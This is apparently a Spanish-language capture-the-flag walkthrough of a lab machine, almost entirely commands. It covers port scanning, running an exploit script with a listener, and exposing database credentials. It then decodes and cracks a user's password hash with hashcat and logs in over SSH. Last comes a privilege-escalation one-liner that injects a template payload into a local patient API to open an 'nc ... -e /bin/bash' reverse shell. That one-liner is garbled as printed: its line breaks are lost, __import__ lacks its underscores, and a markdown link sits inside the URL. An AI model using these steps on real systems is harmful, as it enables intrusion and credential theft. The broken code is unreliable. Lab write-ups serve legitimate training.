

```shell
nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.3.105 -oG allPorts
```

```shell
[*] IP Address: 10.129.3.105
[*] Open ports: 22,80,443,6661
```

```shell
nmap -p22,80,443,6661 -sCV 10.129.3.105 -oN targeted
```

Navegamos al puerto `80`

```shell
python3 test.py -u https://10.129.3.105/ -lh 10.10.15.92 -lp 4444
```

```shell
database.username = mirthdb
database.password = MirthPass123!
```

encontramos un usuario
```ad-hint
sedric::u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

El hash parece base64
```shell
python3 -c "
import base64
data = base64.b64decode('u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==')
salt = base64.b64encode(data[:8]).decode()
hash = base64.b64encode(data[8:]).decode()
print(f'sha256:600000:{salt}:{hash}')
"
```

Para sacar el hash y poder crackearlo
```shell
hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt
```

Obtenienco como contraseña
```shell
snowflake1
```

Pudiendonos conectar ahora por ssh
```shell
ssh sedric@10.129.3.105  
```

Podemos escalar privilegios con
```py
python3 -c " import urllib.request, base64 cmd = 'nc 10.10.14.26 5555 -e /bin/bash' b64_cmd = base64.b64encode(cmd.encode()).decode() xml = f'<patient><timestamp>20250101120000</timestamp><sender_app>TEST</sender_app><id>12345</id><firstname>{{import("os").system(import("base64").b64decode("{b64_cmd}").decode())}}</firstname><lastname>Doe</lastname><birth_date>01/01/1990</birth_date><gender>M</gender></patient>' req = urllib.request.Request('[http://127.0.0.1:54321/addPatient](http://127.0.0.1:54321/addPatient "http://127.0.0.1:54321/addPatient")', data=xml.encode(), headers={'Content-Type': 'application/xml'}) urllib.request.urlopen(req) "
```

